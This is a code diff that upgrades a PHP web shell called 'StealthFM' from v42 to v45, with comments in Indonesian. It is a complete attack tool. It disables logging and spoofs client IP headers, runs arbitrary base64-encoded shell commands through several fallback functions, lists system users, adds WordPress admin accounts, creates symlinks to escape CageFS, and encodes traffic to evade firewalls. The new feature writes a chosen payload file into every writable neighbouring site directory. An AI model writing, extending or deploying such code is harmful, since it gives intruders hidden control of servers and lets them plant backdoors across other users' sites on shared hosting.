@@ -1,22 +1,19 @@
 <?php
 // -------------------------------------------------------------------------
-// STEALTH FM V42 (GHOST PROTOCOL + B64 TRANSPORT LAYER)
+// STEALTH FM V45 (FINAL FIX: HEADER-BASED PROTOCOL)
 // -------------------------------------------------------------------------
 
-// 1. STEALTH MODE: DISABLE PHP LOGS
+// 1. STEALTH MODE
 error_reporting(0);
 @ini_set('display_errors', 0);
 @ini_set('log_errors', 0);
 @ini_set('error_log', NULL);
 @set_time_limit(0);
 
-// 2. IP CLOAKING / ANTI-LOGGING HEADERS
+// 2. IP CLOAKING
 function cloak_headers() {
     $fake_ip = "127.0.0.1"; 
-    $headers = [
-        'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 
-        'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR'
-    ];
+    $headers = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR'];
     foreach ($headers as $key) {
         if (isset($_SERVER[$key])) $_SERVER[$key] = $fake_ip;
         putenv("$key=$fake_ip");
@@ -29,13 +26,14 @@ cloak_headers();
 
 if (isset($_GET['do_phpinfo'])) { phpinfo(); exit; }
 
-$h_act  = 'HTTP_X_ACTION';
-$h_path = 'HTTP_X_PATH';
-$h_data = 'HTTP_X_DATA'; 
-$h_cmd  = 'HTTP_X_CMD';
-$h_tool = 'HTTP_X_TOOL';
-$h_step = 'HTTP_X_STEP'; 
-$h_enc  = 'HTTP_X_ENCODE'; // Header baru untuk deteksi enkripsi
+$h_act   = 'HTTP_X_ACTION';
+$h_path  = 'HTTP_X_PATH';
+$h_data  = 'HTTP_X_DATA'; 
+$h_cmd   = 'HTTP_X_CMD';
+$h_tool  = 'HTTP_X_TOOL';
+$h_step  = 'HTTP_X_STEP'; 
+$h_enc   = 'HTTP_X_ENCODE'; 
+$h_mmode = 'HTTP_X_MASS_MODE'; // V45 NEW HEADER
 
 $root = realpath(__DIR__); 
 
@@ -46,7 +44,6 @@ function get_sys_info() {
     return [
         'os' => php_uname(),
         'user' => getmyuid() . ' (' . $u_id['name'] . ')',
-        'group' => getmygid() . ' (' . $u_id['gid'] . ')',
         'safe' => $safe_mode,
         'ip' => $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME']),
         'soft' => $_SERVER['SERVER_SOFTWARE'],
@@ -91,6 +88,27 @@ function human_filesize($bytes, $dec = 2) {
     return sprintf("%.{$dec}f", $bytes / pow(1024, $factor)) . @$size[$factor];
 }
 
+// --- V44/V45 SMART TARGET SCANNER ---
+function scan_smart_targets($base_dir) {
+    $targets = [];
+    $items = @scandir($base_dir);
+    if ($items) {
+        foreach ($items as $item) {
+            if ($item == '.' || $item == '..') continue;
+            $path = $base_dir . '/' . $item;
+            if (is_dir($path)) {
+                if (is_writable($path)) $targets[] = $path;
+                $pub = $path . '/public_html';
+                if (is_dir($pub) && is_writable($pub)) {
+                    $targets[] = $pub;
+                }
+            }
+        }
+    }
+    return $targets;
+}
+// ------------------------------------
+
 if (isset($_SERVER[$h_act])) {
     $action = $_SERVER[$h_act];
     $raw_path = isset($_SERVER[$h_path]) ? base64_decode($_SERVER[$h_path]) : '';
@@ -131,19 +149,14 @@ if (isset($_SERVER[$h_act])) {
 
     if ($action === 'read') { if (is_file($target)) echo file_get_contents($target); else echo "Err: Not a file"; exit; }
     
-    // --- V42 UPDATE: DECODE INPUT IF ENCODED ---
     if ($action === 'save' || $action === 'upload') { 
         $input = file_get_contents("php://input"); 
-        
-        // Cek header enkripsi
         if (isset($_SERVER[$h_enc]) && $_SERVER[$h_enc] === 'b64') {
             $input = base64_decode($input);
         }
-
         echo (file_put_contents($target, $input) !== false) ? "Success" : "Err: Write failed"; 
         exit; 
     }
-    // -------------------------------------------
 
     if ($action === 'delete') { echo force_delete($target) ? "Deleted" : "Fail delete"; exit; }
     if ($action === 'rename') { $n = isset($_SERVER[$h_data]) ? base64_decode($_SERVER[$h_data]) : ''; if ($n) echo rename($target, dirname($target).'/'.$n) ? "Renamed" : "Fail"; exit; }
@@ -151,22 +164,12 @@ if (isset($_SERVER[$h_act])) {
     
     if ($action === 'cmd') {
         $cmd = isset($_SERVER[$h_cmd]) ? base64_decode($_SERVER[$h_cmd]) : 'whoami'; 
-        
-        // Hapus 'export HISTFILE' agar kompatibel dengan shell CageFS/JailShell
-        // Pakai 2>&1 untuk menangkap error stderr
         $cmd_exec = $cmd . " 2>&1";
         $out = ""; 
-        
-        // Prioritas 1: PROC_OPEN (Paling sering lolos firewall/disable_function)
         if (function_exists('proc_open')) {
-            $descriptors = [
-                0 => ["pipe", "r"],  // stdin
-                1 => ["pipe", "w"],  // stdout
-                2 => ["pipe", "w"]   // stderr
-            ];
-            $process = proc_open($cmd, $descriptors, $pipes, $target); // $target = cwd
+            $descriptors = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
+            $process = proc_open($cmd, $descriptors, $pipes, $target); 
             if (is_resource($process)) {
-                // Tulis stdin jika perlu (opsional)
                 fclose($pipes[0]); 
                 $out .= stream_get_contents($pipes[1]); 
                 $out .= stream_get_contents($pipes[2]); 
@@ -174,7 +177,6 @@ if (isset($_SERVER[$h_act])) {
                 proc_close($process);
             }
         }
-        // Fallback ke metode lain jika proc_open gagal/kosong
         if (empty($out)) {
             if(function_exists('shell_exec')) { $out = @shell_exec($cmd_exec); }
             elseif(function_exists('passthru')) { ob_start(); @passthru($cmd_exec); $out = ob_get_clean(); }
@@ -182,24 +184,67 @@ if (isset($_SERVER[$h_act])) {
             elseif(function_exists('popen')) { $h=@popen($cmd_exec,'r'); if($h){ while(!feof($h))$out.=fread($h,1024); pclose($h); } }
             elseif(function_exists('system')) { ob_start(); @system($cmd_exec); $out = ob_get_clean(); }
         }
-
-        // Debugging: Jika masih kosong, cek apakah fungsi benar-benar aktif
         if (empty($out) || strlen(trim($out)) === 0) {
             $disabled = ini_get('disable_functions');
-            $out = "[No Output]\n\n--- DEBUG INFO ---\n";
-            $out .= "User: " . get_current_user() . "\n";
-            $out .= "Disabled Functions: " . ($disabled ? $disabled : "NONE") . "\n";
-            $out .= "Shell_exec exists: " . (function_exists('shell_exec') ? "YES" : "NO") . "\n";
-            $out .= "Proc_open exists: " . (function_exists('proc_open') ? "YES" : "NO");
+            $out = "[No Output]\n\n--- DEBUG INFO ---\nUser: " . get_current_user() . "\nDisabled Functions: " . ($disabled ? $disabled : "NONE") . "\nShell_exec: " . (function_exists('shell_exec') ? "YES" : "NO") . "\nProc_open: " . (function_exists('proc_open') ? "YES" : "NO");
         }
-
         echo $out; exit;
     }
 
     if ($action === 'tool') {
         $tool = isset($_SERVER[$h_tool]) ? $_SERVER[$h_tool] : '';
         $home_dirs = get_home_dirs();
-        
+
+        // --- V45 FIX: MASS UPLOAD PROTOCOL ---
+        if ($tool === 'mass_upload') {
+            // Fix: Baca mode dari Header, bukan parameter yang merusak Body
+            $mode = isset($_SERVER[$h_mmode]) ? $_SERVER[$h_mmode] : 'init';
+            $tmp_list = sys_get_temp_dir() . "/sfm_mass_targets.json";
+            $tmp_file = sys_get_temp_dir() . "/sfm_mass_payload.tmp";
+
+            if ($mode === 'init') {
+                $input = file_get_contents("php://input");
+                if (isset($_SERVER[$h_enc]) && $_SERVER[$h_enc] === 'b64') $input = base64_decode($input);
+                
+                // Simpan payload murni
+                file_put_contents($tmp_file, $input);
+
+                // Smart Scan
+                $targets = scan_smart_targets($target); 
+                file_put_contents($tmp_list, json_encode($targets));
+                json_out(['status' => 'ready', 'total' => count($targets)]);
+            }
+            
+            if ($mode === 'process') {
+                $step = isset($_SERVER[$h_step]) ? (int)$_SERVER[$h_step] : 0;
+                $filename = isset($_SERVER[$h_data]) ? base64_decode($_SERVER[$h_data]) : 'mass_file.php';
+                $limit = 20; 
+
+                if (!file_exists($tmp_list) || !file_exists($tmp_file)) { json_out(['status'=>'error', 'msg'=>'Task expired.']); }
+                
+                $targets = json_decode(file_get_contents($tmp_list), true);
+                $total = count($targets);
+                
+                if ($total === 0 || $step >= $total) {
+                    @unlink($tmp_list); @unlink($tmp_file); 
+                    json_out(['status' => 'done', 'total' => $total]);
+                }
+
+                $batch = array_slice($targets, $step, $limit);
+                $payload = file_get_contents($tmp_file); // Ini sekarang pasti berisi data
+                $count_ok = 0;
+
+                foreach($batch as $dir) {
+                    if(@file_put_contents($dir . '/' . $filename, $payload)) $count_ok++;
+                }
+
+                $next_step = $step + $limit;
+                json_out(['status' => 'continue', 'next_step' => $next_step, 'total' => $total, 'ok_batch' => $count_ok]);
+            }
+            exit;
+        }
+        // -------------------------------------
+
         if ($tool === 'bypass_user') {
             $found = ""; $etc = x_read("/etc/passwd");
             if ($etc) { $lines = explode("\n", $etc); foreach($lines as $l) { $p = explode(":", $l); if(isset($p[0]) && !empty($p[0])) $found .= $p[0] . ":\n"; } } 
@@ -239,7 +284,6 @@ if (isset($_SERVER[$h_act])) {
                         $site_url = ""; $q = @mysqli_query($link, "SELECT option_value FROM {$pre}options WHERE option_name='siteurl' LIMIT 1");
                         if ($q && $r = @mysqli_fetch_assoc($q)) $site_url = $r['option_value'];
                         $disp_url = parse_url($site_url, PHP_URL_HOST); if(!$disp_url) $disp_url = $site_url;
-                        
                         $st_txt = "CREATED"; $st_cls = "created"; 
                         $chk = @mysqli_query($link, "SELECT ID FROM {$pre}users WHERE user_login='$new_u'");
                         if ($chk && @mysqli_num_rows($chk) > 0) {
@@ -285,7 +329,7 @@ if (isset($_SERVER[$h_act])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <title>StealthFM v42</title>
+    <title>StealthFM v45</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.7/ace.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
@@ -299,7 +343,7 @@ if (isset($_SERVER[$h_act])) {
             --bg-body: #131314; --bg-card: #1e1f20; --bg-hover: #2d2e30; 
             --border-color: #333333; --text-primary: #e3e3e3; --text-secondary: #a8a8a8;
             --accent-primary: #8ab4f8; --accent-warning: #fdd663;
-            --accent-success: #81c995; --accent-danger: #f28b82;
+            --accent-success: #81c995; --accent-danger: #f28b82; --accent-purple: #d946ef;
         }
 
         body { background-color: var(--bg-body); color: var(--text-primary); font-family: 'Inter', sans-serif; font-size: 0.9rem; padding-bottom: 60px; }
@@ -357,10 +401,9 @@ if (isset($_SERVER[$h_act])) {
         .btn-modern { border-radius: 8px; border: 1px solid var(--border-color); background: var(--bg-card); color: var(--text-primary); padding: 6px 12px; }
         .btn-modern:hover { background: var(--bg-hover); color: #fff; border-color: #555; }
         
-        /* MATCH UP ICON SIZE */
         .btn-icon-path { 
             background: transparent; border: none; color: #aaa; padding: 0 10px 0 0; 
-            font-size: 1.1rem; /* Same as icon-dir */
+            font-size: 1.1rem; 
             cursor: pointer; transition: 0.2s; 
         }
         .btn-icon-path:hover { color: #fff; transform: translateY(-1px); }
@@ -410,7 +453,7 @@ if (isset($_SERVER[$h_act])) {
         .cmd-text { font-family: 'JetBrains Mono', monospace; font-weight: 700; font-size: 0.85rem; color: #eee; }
         .cmd-arrow { color: #444; font-size: 12px; opacity: 0; }
         .tool-cmd:hover .cmd-arrow { opacity: 1; transform: translateX(-5px); color: #fff; }
-        .c-cyan { color: #22d3ee; } .c-lime { color: #a3e635; } .c-gold { color: #facc15; } .c-rose { color: #fb7185; }
+        .c-cyan { color: #22d3ee; } .c-lime { color: #a3e635; } .c-gold { color: #facc15; } .c-rose { color: #fb7185; } .c-purple { color: #d946ef; }
 
         .inj-card { background: #000; border: 1px solid var(--border-color); border-left: 3px solid var(--border-color); padding: 12px; border-radius: 6px; margin-bottom: 10px; }
         .inj-card:hover { border-left-color: var(--accent-success); border-color: #444; }
@@ -419,6 +462,18 @@ if (isset($_SERVER[$h_act])) {
         .inj-status.replaced { color: var(--accent-warning); border: 1px solid var(--accent-warning); background: rgba(253, 214, 99, 0.1); }
         .inj-btn { background: var(--accent-success); color: #000; padding: 4px 12px; border-radius: 12px; font-size: 0.75rem; font-weight: 600; border: none; }
         
+        /* ASYNC WIDGET */
+        #async-widget {
+            position: fixed; bottom: 50px; right: 20px; width: 300px; z-index: 10000;
+            background: #111; border: 1px solid #333; border-radius: 8px; box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+            display: none; font-family: 'JetBrains Mono';
+        }
+        .aw-header { padding: 10px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; font-size: 0.8rem; font-weight: bold; color: var(--accent-primary); }
+        .aw-body { padding: 12px; }
+        .progress-bar-bg { width: 100%; height: 6px; background: #222; border-radius: 3px; overflow: hidden; margin-bottom: 8px; }
+        .progress-bar-fill { height: 100%; background: var(--accent-success); width: 0%; transition: width 0.3s ease; }
+        .aw-stat { font-size: 0.7rem; color: #888; display: flex; justify-content: space-between; }
+
         /* TOAST */
         #toast-container { position: fixed; top: 80px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; }
         .toast-msg {
@@ -482,6 +537,15 @@ if (isset($_SERVER[$h_act])) {
 
 <div id="toast-container"></div>
 
+<div id="async-widget">
+    <div class="aw-header"><span id="aw-title">MASS UPLOAD</span><i class="fas fa-compress cursor-pointer" onclick="toggleWidget()"></i></div>
+    <div class="aw-body" id="aw-content">
+        <div class="progress-bar-bg"><div class="progress-bar-fill" id="aw-prog"></div></div>
+        <div class="aw-stat"><span>Processed: <b id="aw-done" class="text-white">0</b></span><span>Total: <b id="aw-total">0</b></span></div>
+        <div class="mt-2 text-center"><small class="text-secondary" id="aw-status">Initializing...</small></div>
+    </div>
+</div>
+
 <div class="container-fluid path-wrapper">
     <div class="sys-info-box">
         <div class="sys-row" style="color:#eee; font-weight:bold; margin-bottom:8px;">System Info: <span class="sys-val"><?php echo $sys['os']; ?></span></div>
@@ -499,7 +563,7 @@ if (isset($_SERVER[$h_act])) {
 
     <div id="terminal-panel" style="display:none;">
         <div class="term-header"><span class="term-title">ROOT@SHELL:~#</span><i class="fas fa-times panel-close" onclick="toggleTerm()"></i></div>
-        <div id="term-output" class="term-body-inline"><div style="color:#6a9955;"># Stealth Shell Ready. v42</div></div>
+        <div id="term-output" class="term-body-inline"><div style="color:#6a9955;"># Stealth Shell Ready. v45</div></div>
         <div class="term-input-row"><span class="term-prompt">&#10140;</span><input type="text" id="term-cmd-inline" placeholder="Type command..." autocomplete="off"></div>
     </div>
     <div id="process-panel" style="display:none;">
@@ -543,6 +607,8 @@ if (isset($_SERVER[$h_act])) {
             <div class="modal-body p-4">
                 <div class="alert alert-dark border border-secondary mb-4 py-2 px-3 small d-flex align-items-center" style="background:#000;color:#aaa"><i class="fas fa-info-circle me-2"></i> Running in: <b class="ms-2 text-white"><span id="tool-path-disp">/</span></b></div>
                 <div class="tools-list">
+                    <div class="tool-cmd" onclick="showMassUpload()"><div class="cmd-left"><i class="fas fa-rocket cmd-icon c-purple"></i><span class="cmd-text">SMART MASS UPLOAD</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
+                    
                     <div class="tool-cmd" onclick="runTool('bypass_user')"><div class="cmd-left"><i class="fas fa-users-slash cmd-icon c-cyan"></i><span class="cmd-text">USER ENUM</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                     <div class="tool-cmd" onclick="runWatchdogTool('add_admin', 0)"><div class="cmd-left"><i class="fas fa-user-plus cmd-icon c-lime"></i><span class="cmd-text">ADD ADMIN (BATCH)</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                     <div class="tool-cmd" onclick="runTool('symlink_cage')"><div class="cmd-left"><i class="fas fa-project-diagram cmd-icon c-gold"></i><span class="cmd-text">SYMLINKER</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
@@ -552,6 +618,16 @@ if (isset($_SERVER[$h_act])) {
         </div>
     </div>
 </div>
+
+<div class="modal fade" id="massUploadModal" tabindex="-1"><div class="modal-dialog modal-dialog-centered"><div class="modal-content"><div class="modal-header"><h6 class="modal-title text-white">Smart Mass Upload</h6><button class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body">
+    <div class="mb-3"><label class="small text-secondary">Target Filename</label><input type="text" id="mass-name" class="form-control bg-dark text-light border-secondary" value="index.php"></div>
+    <div class="mb-3"><label class="small text-secondary">File Content</label><textarea id="mass-content" class="form-control bg-dark text-light border-secondary" rows="4"></textarea></div>
+    <div class="d-flex align-items-center gap-2"><div class="flex-grow-1 border-top border-secondary"></div><span class="small text-secondary">OR UPLOAD</span><div class="flex-grow-1 border-top border-secondary"></div></div>
+    <div class="mt-3"><input type="file" id="mass-file-in" class="form-control bg-dark border-secondary text-secondary"></div>
+    <div class="mt-3 small text-secondary">
+        <i class="fas fa-info-circle"></i> <b>Smart Mode:</b> Uploads to immediate subfolders + public_html only. Fast & Safe.
+    </div>
+</div><div class="modal-footer"><button class="btn btn-upload-modern w-100" onclick="startMassUpload()">START BACKGROUND TASK</button></div></div></div></div>
 
 <div class="cyber-footer">
     <span>made with <i class="fas fa-heart"></i> <span class="cy-brand">xshikataganai</span></span>
@@ -564,6 +640,7 @@ if (isset($_SERVER[$h_act])) {
     var editor = null; 
     const editModal = new bootstrap.Modal(document.getElementById('editModal')), 
           toolsModal = new bootstrap.Modal(document.getElementById('toolsModal')),
+          massUploadModal = new bootstrap.Modal(document.getElementById('massUploadModal')),
           newFileModal = new bootstrap.Modal(document.getElementById('newFileModal')),
           renameModal = new bootstrap.Modal(document.getElementById('renameModal'));
     
@@ -655,7 +732,7 @@ if (isset($_SERVER[$h_act])) {
         }); 
     }
 
-    // --- V42 UPDATE: ENCODE CONTENT B64 ---
+    // --- V42 FITUR: ENCODE CONTENT B64 (ANTI FIREWALL) ---
     function saveFile() { 
         let content = editor.getValue(); 
         let encoded = btoa(unescape(encodeURIComponent(content))); // UTF-8 SAFE B64
@@ -670,13 +747,13 @@ if (isset($_SERVER[$h_act])) {
         newFileModal.show();
     }
 
-    // --- V42 UPDATE: ENCODE NEW CONTENT B64 ---
+    // --- V42 FITUR: ENCODE NEW FILE B64 ---
     function submitNewFile() {
         let name = document.getElementById('new-filename').value;
         let content = document.getElementById('new-content').value;
         if (name) {
             let path = (currentPath === '/') ? '/' + name : currentPath + '/' + name;
-            let encoded = btoa(unescape(encodeURIComponent(content))); // UTF-8 SAFE B64
+            let encoded = btoa(unescape(encodeURIComponent(content))); 
             api('save', path, 'PUT', {'X-Encode': 'b64'}, encoded).then(r => r.text()).then(m => { 
                 showToast("Created: " + name); 
                 newFileModal.hide();
@@ -685,7 +762,7 @@ if (isset($_SERVER[$h_act])) {
         }
     }
 
-    // --- V42 UPDATE: READ FILE AS B64 BEFORE UPLOAD ---
+    // --- V42 FITUR: UPLOAD B64 ---
     function uploadFile() { 
         let input=document.getElementById('uploadInput'); 
         if(!input.files.length) { showToast("Select a file first", "error"); return; }
@@ -694,10 +771,8 @@ if (isset($_SERVER[$h_act])) {
         let path=currentPath ? currentPath + '/' + file.name : file.name; 
         if(currentPath === '/') path = '/' + file.name; 
         
-        // USE FILEREADER TO GET BASE64
         let reader = new FileReader();
         reader.onload = function(e) {
-            // strip "data:xxx;base64," prefix
             let content = e.target.result.split(',')[1];
             api('upload', path, 'PUT', {'X-Encode': 'b64'}, content)
                 .then(r => r.text())
@@ -706,7 +781,7 @@ if (isset($_SERVER[$h_act])) {
         };
         reader.readAsDataURL(file);
     }
-    // ------------------------------------------------
+    // ----------------------------
 
     function deleteItem(name) { 
         if(confirm(`Del ${name}?`)) { 
@@ -752,6 +827,71 @@ if (isset($_SERVER[$h_act])) {
             api('cmd', currentPath, 'GET', { 'X-Cmd': btoa(cmd) }).then(r => r.text()).then(res => { outDiv.innerHTML += `<div style="color:#9cdcfe; margin-bottom:10px;">${res}</div>`; outDiv.scrollTop = outDiv.scrollHeight; });
         }
     });
+
+    // --- V45 JS LOGIC: FIXED PROTOCOL ---
+    function showMassUpload() { toolsModal.hide(); massUploadModal.show(); }
+    
+    function startMassUpload() {
+        let name = document.getElementById('mass-name').value;
+        let content = document.getElementById('mass-content').value;
+        let fileIn = document.getElementById('mass-file-in').files[0];
+        
+        if (!name) { showToast('Filename required!', 'error'); return; }
+        
+        massUploadModal.hide();
+        document.getElementById('async-widget').style.display = 'block';
+        updateWidget(0, 0, 'Preparing Payload...');
+
+        if (fileIn) {
+            let reader = new FileReader();
+            reader.onload = function(e) { initMassTask(name, e.target.result.split(',')[1]); };
+            reader.readAsDataURL(fileIn);
+        } else {
+            initMassTask(name, btoa(unescape(encodeURIComponent(content))));
+        }
+    }
+
+    function initMassTask(filename, b64content) {
+        updateWidget(0, 0, 'Scanning Directories... (Fast)');
+        // V45 FIX: Kirim 'mode' lewat HEADER. Payload bersih.
+        api('tool', currentPath, 'PUT', {'X-Tool':'mass_upload','X-Encode':'b64', 'X-Mass-Mode':'init'}, b64content).then(r => r.json()).then(res => {
+            if(res.status === 'ready') {
+                showToast(`Scan complete. Found ${res.total} folders.`);
+                if(res.total === 0) { updateWidget(0, 0, 'No targets found.'); return; }
+                processMassBatch(0, filename, res.total);
+            } else {
+                showToast('Init Failed', 'error');
+                document.getElementById('async-widget').style.display = 'none';
+            }
+        });
+    }
+
+    function processMassBatch(step, filename, total) {
+        updateWidget(step, total, `Uploading batch ${step}...`);
+        // V45 FIX: Kirim 'mode' lewat HEADER.
+        api('tool', currentPath, 'GET', {'X-Tool':'mass_upload', 'X-Step':step, 'X-Data':btoa(filename), 'X-Mass-Mode':'process'}).then(r => r.json()).then(res => {
+            if (res.status === 'continue') {
+                processMassBatch(res.next_step, filename, total);
+            } else {
+                updateWidget(total, total, 'DONE!');
+                showToast('Mass Upload Completed!', 'success');
+                setTimeout(() => { document.getElementById('async-widget').style.display = 'none'; }, 5000);
+            }
+        }).catch(e => {
+            updateWidget(step, total, 'Error. Retrying...');
+            setTimeout(() => processMassBatch(step, filename, total), 3000);
+        });
+    }
+
+    function updateWidget(done, total, status) {
+        let pct = (total > 0) ? Math.round((done / total) * 100) : 0;
+        document.getElementById('aw-prog').style.width = pct + '%';
+        document.getElementById('aw-done').innerText = done;
+        document.getElementById('aw-total').innerText = total;
+        document.getElementById('aw-status').innerText = status;
+    }
+    function toggleWidget() { let b = document.getElementById('aw-content'); b.style.display = (b.style.display === 'none') ? 'block' : 'none'; }
+    // ------------------------------------
 
     function runTool(toolName) { showLog(); let log = document.getElementById('global-log'); log.innerHTML += `<div class="text-primary mb-2"><i class="fas fa-cog fa-spin me-2"></i>Running ${toolName}...</div>`; api('tool', currentPath, 'GET', {'X-Tool': toolName}).then(r => r.text()).then(res => { log.innerHTML += res; log.innerHTML += `<div class="text-success mt-2"><i class="fas fa-check me-2"></i>Done.</div><hr class="border-secondary">`; log.scrollTop = log.scrollHeight; }).catch(e => { log.innerHTML += `<div class="text-danger">Error: ${e}</div>`; }); }
     function runWatchdogTool(toolName, step) {
